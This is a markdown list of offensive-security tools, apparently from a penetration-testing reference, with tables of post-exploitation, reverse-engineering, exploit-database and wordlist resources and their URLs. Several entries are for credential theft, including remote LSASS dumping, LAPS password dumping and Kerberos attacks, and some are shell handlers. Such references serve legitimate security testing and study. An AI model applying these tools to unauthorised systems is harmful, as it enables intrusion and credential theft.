### Post Exploitation

|Tool|URL|Purpose|
|---|---|---|
|BloodHound|https://github.com/BloodHoundAD/BloodHound|AD attack path visualization|
|Certify|https://github.com/GhostPack/Certify|AD CS enumeration (Windows)|
|Certipy|https://github.com/ly4k/Certipy|AD CS attacks (Linux)|
|Impacket|https://github.com/fortra/impacket|AD protocol suite|
|Evil-WinRM|https://github.com/Hackplayers/evil-winrm|WinRM shell|
|Rubeus|https://github.com/GhostPack/Rubeus|Kerberos attacks|
|enum4linux-ng|https://github.com/cddmp/enum4linux-ng|SMB/LDAP enumeration|
|PEASS-ng|https://github.com/carlospolop/PEASS-ng|PrivEsc automation (no auto exploit)|
|GTFOBins|https://gtfobins.github.io|Linux SUID/sudo escalation|
|LOLBAS|https://lolbas-project.github.io|Windows living-off-the-land|
|pspy|https://github.com/DominicBreuker/pspy|Linux process spy (no root)|
|LinEnum|https://github.com/rebootuser/LinEnum|Linux enumeration script|
|JAWS|https://github.com/411Hall/JAWS|Windows enumeration script|
|Watson|https://github.com/rasta-mouse/Watson|Windows missing patches|
|WESNG|https://github.com/bitsadmin/wesng|Windows Exploit Suggester NG|
|lsassy|https://github.com/Hackndo/lsassy|Remote LSASS dump|
|LAPSDumper|https://github.com/n00py/LAPSDumper|Dump LAPS passwords|
|PyWhisker|https://github.com/ShutdownRepo/pywhisker|Shadow credentials (Linux)|
|Whisker|https://github.com/eladshamir/Whisker|Shadow credentials (Windows)|
|powercat|https://github.com/besimorhino/powercat|PowerShell netcat|
|pwncat|https://github.com/calebstewart/pwncat|Enhanced shell handler|
|RunasCs|https://github.com/antonioCoco/RunasCs|Run as alternate user|

### Reverse Engineering

|Tool|URL|Purpose|
|---|---|---|
|Ghidra|https://github.com/NationalSecurityAgency/ghidra|Disassembler / decompiler|
|Radare2|https://github.com/radareorg/radare2|Reverse engineering framework|
|GEF|https://github.com/hugsy/gef|GDB enhanced features|
|pwndbg|https://github.com/pwndbg/pwndbg|GDB plugin for exploitation|
|dnSpy|https://github.com/dnSpy/dnSpy|.NET decompiler / debugger|
|JD-GUI|https://github.com/java-decompiler/jd-gui|Java decompiler|
|binwalk|https://github.com/ReFirmLabs/binwalk|Firmware analysis|
|ImHex|https://github.com/WerWolv/ImHex|Hex editor|

### Exploit Databases

|Database|URL|
|---|---|
|Exploit Database|https://www.exploit-db.com|
|Packet Storm|https://packetstormsecurity.com|
|0day.today|https://0day.today|
|Sploitus|https://sploitus.com|
|Kernelhub|https://github.com/Ascotbe/Kernelhub|

### Wordlists

|Tool|URL|Purpose|
|---|---|---|
|SecLists|https://github.com/danielmiessler/SecLists|Comprehensive wordlists|
|CeWL|https://github.com/digininja/cewl|Custom wordlist from website|
|CUPP|https://github.com/Mebus/cupp|Personalized password profiler|
|bopscrk|https://github.com/R3nt0n/bopscrk|Target-based wordlist generator|



